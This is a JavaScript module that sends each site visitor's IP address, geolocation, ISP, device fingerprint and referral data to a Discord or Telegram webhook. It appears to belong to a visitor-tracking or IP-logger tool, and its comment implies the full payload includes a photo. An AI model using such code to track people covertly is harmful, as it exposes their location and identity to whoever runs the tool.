/**
 * Optional Telegram / Discord notify on new visit.
 * Static hosts expose these URLs in the client — prefer Supabase Database Webhooks
 * for production (see supabase/migration_v4.sql). Keep payloads lean (no photo).
 */

function cfg() {
  return window.APP_CONFIG || {};
}

function leanSummary(payload) {
  const geo = payload.ip_geo || {};
  const traffic = payload.device_info?.traffic?.current || {};
  return {
    at: new Date().toISOString(),
    tag: payload.tag || "—",
    ip: payload.ip || "—",
    geo: [geo.city, geo.region, geo.country].filter(Boolean).join(", ") || "—",
    isp: geo.org || "—",
    fp: payload.fingerprint ? String(payload.fingerprint).slice(0, 12) : "—",
    bot: !!payload.is_bot,
    utm: traffic.utm_source || traffic.ref || "—",
    ref: traffic.referrer_host || "—",
  };
}

function formatText(s) {
  return [
    `HIT ${s.bot ? "[BOT]" : "[OK]"}`,
    `TAG /${s.tag}`,
    `IP ${s.ip}`,
    `GEO ${s.geo}`,
    `ISP ${s.isp}`,
    `FP ${s.fp}`,
    `UTM ${s.utm} · REF ${s.ref}`,
    s.at,
  ].join("\n");
}

async function postJson(url, body) {
  const ctrl = new AbortController();
  const t = setTimeout(() => ctrl.abort(), 4000);
  try {
    await fetch(url, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify(body),
      signal: ctrl.signal,
      keepalive: true,
    });
  } catch {
    /* ignore */
  } finally {
    clearTimeout(t);
  }
}

export function notifyWebhooks(payload) {
  const c = cfg();
  if (c.webhooksEnabled === false) return;

  const summary = leanSummary(payload);
  const text = formatText(summary);

  const discord = c.discordWebhookUrl;
  if (discord && typeof discord === "string" && discord.startsWith("https://")) {
    postJson(discord, {
      content: "```\n" + text.slice(0, 1800) + "\n```",
    });
  }

  const token = c.telegramBotToken;
  const chatId = c.telegramChatId;
  if (token && chatId) {
    postJson(`https://api.telegram.org/bot${token}/sendMessage`, {
      chat_id: chatId,
      text: text.slice(0, 3500),
      disable_web_page_preview: true,
    });
  }
}
